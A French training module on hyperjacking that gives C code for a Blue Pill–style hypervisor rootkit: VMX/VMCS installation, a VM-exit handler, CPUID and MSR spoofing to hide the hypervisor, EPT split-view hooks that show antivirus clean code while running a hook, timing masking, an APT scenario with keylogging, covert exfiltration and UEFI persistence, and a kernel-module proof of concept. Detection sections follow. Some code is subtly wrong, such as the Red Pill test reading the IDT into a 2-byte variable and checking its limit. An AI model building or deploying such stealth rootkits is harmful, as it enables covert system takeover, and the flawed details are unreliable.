# Module A04 : Théorie du Hyperjacking

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre le concept de hyperjacking et Blue Pill
- [ ] Maîtriser l'architecture d'un rootkit hyperviseur
- [ ] Analyser les techniques d'installation furtive
- [ ] Identifier les vecteurs de détection
- [ ] Évaluer l'impact en contexte Red Team

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Module A01 : Virtualisation basics (VMCS, VMX, EPT)
- Architecture x86/x64 (registres de contrôle, MSRs)
- Notions de rootkits (hooking, stealth)

## Introduction

Le **hyperjacking** consiste à installer un hyperviseur sous un système d'exploitation déjà en cours d'exécution, transformant ainsi l'OS en machine virtuelle guest sans qu'il s'en aperçoive. C'est la technique de rootkit la plus furtive qui existe.

### Pourquoi ce sujet est important ?

Imaginez qu'un magicien place une pièce de théâtre entière sous un dôme de verre invisible. Les acteurs (l'OS) continuent de jouer sans savoir qu'ils sont observés et contrôlés de l'extérieur (l'hyperviseur malveillant).

Pour un Red Teamer :
- **Furtivité maximale** : Invisible depuis Ring 0 (kernel)
- **Persistance ultime** : Survit aux reinstalls OS si installé dans UEFI
- **Contrôle total** : Intercepte toutes les opérations système

Pour un défenseur :
- **Threat intel** : Comprendre les APTs avancées
- **Detection** : Savoir quoi chercher (timing anomalies, MSRs)
- **Incident response** : Forensics sur systems compromis

## 1. Qu'est-ce que le Hyperjacking ?

### 1.1 Définition

```
Avant Hyperjacking:              Après Blue Pill:
┌──────────────────┐            ┌──────────────────┐
│  Applications    │            │  Applications    │
├──────────────────┤            ├──────────────────┤
│  OS Kernel       │            │  OS Kernel       │ (pense être en Ring 0)
├──────────────────┤            ├──────────────────┤
│  Hardware        │            │ Blue Pill Rootkit│ (VMX Root Mode)
└──────────────────┘            ├──────────────────┤
                                │  Hardware        │
                                └──────────────────┘
```

L'OS s'exécute maintenant en **VMX Non-Root Mode**, pensant être en Ring 0, mais il est en réalité dans une VM contrôlée par Blue Pill.

### 1.2 Historique : SubVirt et Blue Pill

**SubVirt (2006)** - Microsoft Research & Universit y of Michigan
- Premier POC de VM-based rootkit
- Redémarre la machine dans un VMM

**Blue Pill (2006)** - Joanna Rutkowska
- Install hyperviseur SANS redémarrage
- Utilise VT-x/SVM pour la furtivité
- Démo à Black Hat 2006

```
Workflow Blue Pill:
1. Charger driver en Ring 0
2. Activer VMX (VMXON)
3. Configurer VMCS
4. Capturer l'état CPU actuel
5. VMLAUNCH → OS devient guest
6. L'utilisateur ne voit rien changer
```

## 2. Architecture d'un Rootkit Hyperviseur

### 2.1 Composants

```
┌─────────────────────────────────────────────┐
│         Rootkit Hyperviseur (Blue Pill)     │
├─────────────────────────────────────────────┤
│ 1. Loader (Ring 0 driver)                   │
│    - Installe l'hyperviseur                 │
│    - Active VMX                             │
├─────────────────────────────────────────────┤
│ 2. VMM Core                                 │
│    - VM Exit handler                        │
│    - Émulation d'instructions               │
├─────────────────────────────────────────────┤
│ 3. Hooks & Interception                     │
│    - CPUID spoofing                         │
│    - MSR filtering                          │
│    - Syscall monitoring                     │
├─────────────────────────────────────────────┤
│ 4. Stealth Engine                           │
│    - Masquer présence hyperviseur           │
│    - Anti-detection                         │
└─────────────────────────────────────────────┘
```

### 2.2 Flux d'installation

```c
// Pseudocode : Installation Blue Pill

int install_bluepill(void) {
    // 1. Vérifier support VT-x
    if (!check_vmx_support()) {
        return -1;
    }

    // 2. Activer VMX dans CR4
    uint64_t cr4 = read_cr4();
    cr4 |= CR4_VMXE;  // Bit 13
    write_cr4(cr4);

    // 3. Activer VMX avec VMXON
    vmxon_region_t *vmxon = alloc_aligned(4096);
    vmxon->revision_id = read_msr(MSR_IA32_VMX_BASIC) & 0x7FFFFFFF;
    asm volatile("vmxon %0" : : "m"(*vmxon));

    // 4. Allouer et initialiser VMCS
    vmcs_t *vmcs = alloc_aligned(4096);
    vmcs->revision_id = vmxon->revision_id;
    asm volatile("vmclear %0" : : "m"(*vmcs));
    asm volatile("vmptrld %0" : : "m"(*vmcs));

    // 5. Configurer Guest State (= état actuel)
    setup_guest_state();

    // 6. Configurer Host State (= VM Exit handler)
    setup_host_state();

    // 7. Configurer VM Execution Controls
    setup_vm_controls();

    // 8. Lancer la VM
    asm volatile("vmlaunch");

    // Si on arrive ici, vmlaunch a échoué
    return -1;
}
```

## 3. Configuration du VMCS

### 3.1 Guest State Area

Le guest state doit capturer l'état **exact** du CPU au moment du VMLAUNCH.

```c
void setup_guest_state(void) {
    // Registres de contrôle
    vmwrite(GUEST_CR0, read_cr0());
    vmwrite(GUEST_CR3, read_cr3());  // Page table actuelle
    vmwrite(GUEST_CR4, read_cr4());

    // Registres généraux
    vmwrite(GUEST_RIP, (uint64_t)&&after_vmlaunch);
    vmwrite(GUEST_RSP, read_rsp());
    vmwrite(GUEST_RFLAGS, read_rflags());

    // Segments
    vmwrite(GUEST_CS_SELECTOR, read_cs());
    vmwrite(GUEST_CS_BASE, 0);
    vmwrite(GUEST_CS_LIMIT, 0xFFFFFFFF);
    vmwrite(GUEST_CS_AR_BYTES, 0xA09B);  // Code64, DPL=0

    // ... tous les autres segments (DS, ES, SS, FS, GS) ...

    // GDTR, IDTR
    vmwrite(GUEST_GDTR_BASE, read_gdtr_base());
    vmwrite(GUEST_GDTR_LIMIT, read_gdtr_limit());
    vmwrite(GUEST_IDTR_BASE, read_idtr_base());
    vmwrite(GUEST_IDTR_LIMIT, read_idtr_limit());

    // MSRs importants
    vmwrite(GUEST_IA32_DEBUGCTL, read_msr(MSR_IA32_DEBUGCTL));
    vmwrite(GUEST_IA32_SYSENTER_CS, read_msr(MSR_IA32_SYSENTER_CS));
    vmwrite(GUEST_IA32_SYSENTER_ESP, read_msr(MSR_IA32_SYSENTER_ESP));
    vmwrite(GUEST_IA32_SYSENTER_EIP, read_msr(MSR_IA32_SYSENTER_EIP));

after_vmlaunch:
    // Le code continue ici après VMLAUNCH
    return;
}
```

### 3.2 Host State Area

L'état où revenir lors d'un VM Exit.

```c
void setup_host_state(void) {
    // RIP = handler de VM Exit
    vmwrite(HOST_RIP, (uint64_t)vmexit_handler);

    // Stack pour le handler
    vmwrite(HOST_RSP, (uint64_t)vmm_stack + VMM_STACK_SIZE);

    // Registres de contrôle
    vmwrite(HOST_CR0, read_cr0());
    vmwrite(HOST_CR3, vmm_cr3);  // Page table du VMM
    vmwrite(HOST_CR4, read_cr4());

    // Segments
    vmwrite(HOST_CS_SELECTOR, KERNEL_CS);
    vmwrite(HOST_SS_SELECTOR, KERNEL_SS);
    vmwrite(HOST_DS_SELECTOR, KERNEL_DS);
    vmwrite(HOST_ES_SELECTOR, KERNEL_DS);
    vmwrite(HOST_FS_SELECTOR, KERNEL_DS);
    vmwrite(HOST_GS_SELECTOR, KERNEL_DS);
    vmwrite(HOST_TR_SELECTOR, KERNEL_TR);

    // GDTR, IDTR
    vmwrite(HOST_GDTR_BASE, read_gdtr_base());
    vmwrite(HOST_IDTR_BASE, read_idtr_base());

    // MSRs
    vmwrite(HOST_IA32_SYSENTER_CS, read_msr(MSR_IA32_SYSENTER_CS));
    vmwrite(HOST_IA32_SYSENTER_ESP, read_msr(MSR_IA32_SYSENTER_ESP));
    vmwrite(HOST_IA32_SYSENTER_EIP, read_msr(MSR_IA32_SYSENTER_EIP));
}
```

### 3.3 VM Execution Controls

Configure quelles instructions/events déclenchent un VM Exit.

```c
void setup_vm_controls(void) {
    uint32_t controls;

    // Primary Processor-Based Controls
    controls = read_msr(MSR_IA32_VMX_PROCBASED_CTLS);
    controls |= CPU_BASED_HLT_EXITING;       // Exit sur HLT
    controls |= CPU_BASED_INVLPG_EXITING;    // Exit sur INVLPG
    controls |= CPU_BASED_CR3_LOAD_EXITING;  // Exit sur mov cr3
    controls |= CPU_BASED_CR3_STORE_EXITING;
    controls |= CPU_BASED_USE_MSR_BITMAPS;   // Filtre MSR access
    vmwrite(CPU_BASED_VM_EXEC_CONTROL, controls);

    // Secondary Processor-Based Controls
    controls = read_msr(MSR_IA32_VMX_PROCBASED_CTLS2);
    controls |= SECONDARY_EXEC_ENABLE_EPT;   // Activer EPT
    controls |= SECONDARY_EXEC_RDTSCP;
    vmwrite(SECONDARY_VM_EXEC_CONTROL, controls);

    // EPT Pointer (si EPT activé)
    vmwrite(EPT_POINTER, setup_ept_tables());

    // MSR Bitmap (filtrer RDMSR/WRMSR)
    setup_msr_bitmap();

    // VM Exit Controls
    controls = read_msr(MSR_IA32_VMX_EXIT_CTLS);
    controls |= VM_EXIT_HOST_ADDR_SPACE_SIZE;  // 64-bit host
    vmwrite(VM_EXIT_CONTROLS, controls);

    // VM Entry Controls
    controls = read_msr(MSR_IA32_VMX_ENTRY_CTLS);
    controls |= VM_ENTRY_IA32E_MODE;  // Guest en 64-bit
    vmwrite(VM_ENTRY_CONTROLS, controls);
}
```

## 4. VM Exit Handler

Le cœur du rootkit : gérer les VM Exits.

```c
void vmexit_handler(void) {
    uint64_t exit_reason, exit_qualification;
    uint64_t guest_rip, guest_rsp;

    // Lire la raison du VM Exit
    vmread(VM_EXIT_REASON, &exit_reason);
    vmread(EXIT_QUALIFICATION, &exit_qualification);
    vmread(GUEST_RIP, &guest_rip);

    switch (exit_reason & 0xFFFF) {
        case EXIT_REASON_CPUID:
            handle_cpuid();
            break;

        case EXIT_REASON_RDMSR:
            handle_rdmsr();
            break;

        case EXIT_REASON_WRMSR:
            handle_wrmsr();
            break;

        case EXIT_REASON_CR_ACCESS:
            handle_cr_access(exit_qualification);
            break;

        case EXIT_REASON_EPT_VIOLATION:
            handle_ept_violation(exit_qualification);
            break;

        case EXIT_REASON_VMCALL:
            handle_hypercall();
            break;

        default:
            // Erreur : exit inattendu
            panic("Unexpected VM Exit: %llx\n", exit_reason);
    }

    // Incrémenter RIP pour passer l'instruction
    uint64_t instr_len;
    vmread(VM_EXIT_INSTRUCTION_LEN, &instr_len);
    vmwrite(GUEST_RIP, guest_rip + instr_len);

    // Reprendre l'exécution du guest
    asm volatile("vmresume");

    // Si on arrive ici, vmresume a échoué
    panic("VMRESUME failed\n");
}
```

## 5. Techniques de Hooking

### 5.1 CPUID Spoofing

Masquer la présence de l'hyperviseur.

```c
void handle_cpuid(void) {
    uint32_t eax, ebx, ecx, edx;

    // Lire les registres du guest
    vmread(GUEST_RAX, &eax);
    vmread(GUEST_RCX, &ecx);

    // Exécuter CPUID dans le host
    __cpuid_count(eax, ecx, eax, ebx, ecx, edx);

    // Modifier les résultats pour masquer hyperviseur
    if (eax == 1) {
        ecx &= ~(1 << 31);  // Clear Hypervisor bit
    }

    if (eax == 0x40000000) {
        // Fake vendor ID pour ressembler à bare metal
        ebx = ecx = edx = 0;
    }

    // Écrire les résultats modifiés
    vmwrite(GUEST_RAX, eax);
    vmwrite(GUEST_RBX, ebx);
    vmwrite(GUEST_RCX, ecx);
    vmwrite(GUEST_RDX, edx);
}
```

### 5.2 MSR Filtering

Intercepter les accès MSR sensibles.

```c
void handle_rdmsr(void) {
    uint32_t msr;
    uint64_t value;

    vmread(GUEST_RCX, &msr);  // MSR number

    switch (msr) {
        case MSR_IA32_FEATURE_CONTROL:
            // Masquer que VMX est lock
            value = read_msr(msr);
            value &= ~0x5;  // Clear VMX enable bits
            break;

        case MSR_IA32_VMX_BASIC:
            // Retourner 0 (pas de VMX support)
            value = 0;
            break;

        default:
            // MSR normal, lire réellement
            value = read_msr(msr);
            break;
    }

    // Retourner au guest
    vmwrite(GUEST_RAX, value & 0xFFFFFFFF);
    vmwrite(GUEST_RDX, value >> 32);
}
```

### 5.3 Syscall Hooking via EPT

Hooker des fonctions kernel sans modifier le code.

```c
// Configuration EPT pour split-view
void hook_function_ept(void *target_func, void *hook_func) {
    uint64_t gpa = virt_to_gpa(target_func);
    ept_entry_t *entry = get_ept_entry(gpa);

    // Allouer deux pages physiques
    void *read_page = alloc_page();
    void *exec_page = alloc_page();

    // read_page = code original
    memcpy(read_page, target_func, PAGE_SIZE);

    // exec_page = hook
    memcpy(exec_page, hook_func, PAGE_SIZE);

    // Configurer EPT : read/write → read_page, execute → exec_page
    entry->read_access = 1;
    entry->write_access = 1;
    entry->execute_access = 0;
    entry->pfn = page_to_pfn(read_page);

    // Entry séparée pour execute
    ept_entry_t *exec_entry = get_ept_exec_entry(gpa);
    exec_entry->read_access = 0;
    exec_entry->write_access = 0;
    exec_entry->execute_access = 1;
    exec_entry->pfn = page_to_pfn(exec_page);
}

// Résultat :
// - L'AV lit le code original (clean)
// - Le CPU exécute le hook (malicious)
```

## 6. Techniques de Stealth

### 6.1 Timing Mitigation

Compenser la latence des VM Exits.

```c
void handle_rdtsc(void) {
    uint64_t tsc = __rdtsc();

    // Soustraire le coût du VM Exit (estimé)
    tsc -= 1000;  // Cycles approximatifs d'un VM Exit

    vmwrite(GUEST_RAX, tsc & 0xFFFFFFFF);
    vmwrite(GUEST_RDX, tsc >> 32);
}
```

### 6.2 Minimiser les VM Exits

```c
void optimize_vm_exits(void) {
    // Ne pas exit sur toutes les instructions
    // Activer MSR bitmap pour filtrer
    setup_msr_bitmap();

    // Ne pas exit sur CR0/CR4 non critiques
    vmwrite(CR0_GUEST_HOST_MASK, 0);  // Pas d'exit sur CR0
    vmwrite(CR4_GUEST_HOST_MASK, 0);  // Pas d'exit sur CR4

    // Utiliser EPT au lieu de shadow page tables (plus rapide)
    enable_ept();
}
```

## 7. Détection d'un Rootkit Hyperviseur

### 7.1 Indicateurs

```
┌────────────────────────────────────────────┐
│      Détection Hyperjacking                │
├────────────────────────────────────────────┤
│ • Timing anomalies (RDTSC)                 │
│ • CPUID inconsistencies                    │
│ • MSR values anormales                     │
│ • Performance dégradée                     │
│ • Instructions piégées (VMCALL)            │
│ • TLB flush anormaux                       │
└────────────────────────────────────────────┘
```

### 7.2 Test Red Pill

Technique de détection par Joanna Rutkowska.

```c
int detect_blue_pill(void) {
    uint16_t idt_limit;

    // Lire l'IDT limit
    asm volatile("sidt %0" : "=m"(idt_limit));

    // Sur bare metal : limit = 0xFFFF
    // Sous hyperviseur (même Blue Pill) : peut différer

    if (idt_limit != 0xFFFF) {
        printf("[!] Possible hyperviseur détecté\n");
        return 1;
    }

    return 0;
}
```

### 7.3 Détection via Timing

```c
int detect_hyperjacking_timing(void) {
    uint64_t start, end, latency;
    uint64_t threshold = 2000;  // Cycles

    // Mesurer latence d'instruction piégée
    start = __rdtsc();
    asm volatile("cpuid" ::: "eax", "ebx", "ecx", "edx");
    end = __rdtsc();

    latency = end - start;

    if (latency > threshold) {
        printf("[!] Latence anormale : %llu cycles\n", latency);
        printf("[!] Possible VM Exit interception\n");
        return 1;
    }

    return 0;
}
```

## 8. Applications Offensives

### 8.1 Scénario APT

```
Objectif : Persistance long-terme sur serveur critique

Étapes :
1. Compromission initiale (phishing, exploit)
2. Escalade privilèges → Ring 0
3. Installation Blue Pill
4. Monitoring furtif :
   - Keylogging (hooker interrupts clavier)
   - Network sniffing (hooker syscalls réseau)
   - File access logging
5. Exfiltration via canal caché (covert channel)
6. Persistence :
   - Installer dans UEFI (survit reinstall OS)
   - Ou dans bootloader
```

### 8.2 PoC Minimal

```c
// Proof of Concept : Blue Pill simplifié
#include <linux/module.h>
#include <linux/kernel.h>

static int __init bluepill_init(void) {
    printk(KERN_INFO "[BluePill] Installing...\n");

    if (!check_vmx_support()) {
        printk(KERN_ERR "[BluePill] VMX not supported\n");
        return -1;
    }

    // Activer VMX
    enable_vmx();

    // Initialiser VMCS
    setup_vmcs();

    // Lancer hyperviseur
    if (vmlaunch_hypervisor() != 0) {
        printk(KERN_ERR "[BluePill] VMLAUNCH failed\n");
        return -1;
    }

    printk(KERN_INFO "[BluePill] Installed successfully\n");
    printk(KERN_INFO "[BluePill] OS is now a guest VM\n");

    return 0;
}

static void __exit bluepill_exit(void) {
    // Désactiver hyperviseur (VMXOFF)
    printk(KERN_INFO "[BluePill] Unloading...\n");
    asm volatile("vmxoff");
}

module_init(bluepill_init);
module_exit(bluepill_exit);
MODULE_LICENSE("GPL");
```

## 9. Considérations OPSEC

### 9.1 Pour l'attaquant

- **Coût de détection** : Blue Pill est détectable (timing, behavior)
- **Compatibilité** : Nécessite VT-x (pas sur tous les systèmes)
- **Stabilité** : Bugs dans le VMM = BSOD/kernel panic
- **Forensics** : Traces en mémoire (VMCS, EPT tables)

### 9.2 Mitigation (défenseur)

- **Measured boot** : TPM vérifie l'intégrité
- **Nested virtualization disabled** : Bloquer VMX dans VMs
- **Monitoring** : Alerter sur activation VMX inattendue
- **Baseline** : Comparer timing avant/après

## Résumé

- Hyperjacking = installer un hyperviseur sous un OS en cours d'exécution
- Blue Pill (2006) = premier POC de rootkit hyperviseur furtif
- Architecture : Loader, VMM Core, Hooks, Stealth Engine
- Configuration VMCS : Guest State, Host State, Execution Controls
- VM Exit Handler : Intercepte et émule les opérations sensibles
- Hooking : CPUID spoofing, MSR filtering, EPT split-view
- Détection : Timing anomalies, Red Pill test, MSR checks
- Impact : Persistance ultime, furtivité maximale

## Checklist

- [ ] Comprendre le workflow d'installation Blue Pill
- [ ] Savoir configurer un VMCS basique
- [ ] Connaître les techniques de hooking (CPUID, MSR, EPT)
- [ ] Identifier les vecteurs de détection
- [ ] Évaluer la faisabilité en contexte réel

## Exercices

Voir `exercice.md` pour les défis pratiques :
1. Analyser le code de Blue Pill original
2. Implémenter un VM Exit handler minimal
3. Détecter un hyperviseur avec Red Pill

## Ressources complémentaires

- "Blue Pill" par Joanna Rutkowska : https://theinvisiblethings.blogspot.com/
- "SubVirt: Implementing malware with virtual machines" (2006)
- Intel SDM Volume 3C (VMX specification)
- SimpleVisor : https://github.com/ionescu007/SimpleVisor

---

**Navigation**
- [Module précédent : VM Escape Concepts](../A03_vm_escape_concepts/)
- [Module suivant : Cloud Hypervisors](../A05_cloud_hypervisors/)
